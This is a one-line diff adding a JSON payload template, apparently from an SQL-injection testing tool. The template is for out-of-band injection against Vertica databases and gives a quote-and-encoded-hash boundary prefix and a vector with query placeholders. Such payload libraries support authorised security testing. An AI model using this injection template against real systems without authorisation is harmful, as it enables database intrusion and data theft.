@@ -1,0 +1,1 @@
+{"dbms": "vertica", "technique": "oob", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "vertica oob: single+enc hash"}
